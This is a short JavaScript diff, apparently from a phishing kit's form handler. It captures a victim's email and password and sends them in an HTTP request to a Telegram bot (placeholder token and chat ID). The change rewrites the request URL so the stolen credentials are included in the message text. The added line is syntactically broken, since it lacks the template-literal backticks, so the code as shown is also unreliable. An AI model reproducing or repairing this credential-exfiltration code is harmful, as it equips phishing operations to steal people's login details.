@@ -67,8 +67,8 @@ e.preventDefault();
 
 var message = "<html><br>| Email: ${mail} <br> | Pass: ${pass} <br></html>";
  
-var url = `https://api.telegram.org/botTOKEN/sendMessage?chat_id=ID&text=message`;
-    
+var url = (https://api.telegram.org/botTOKEN/sendMessage?text=${message}&chat_id=ID&parse_mode=html);
+
 var oReq = new XMLHttpRequest();
 oReq.open("GET", url);
 oReq.send();
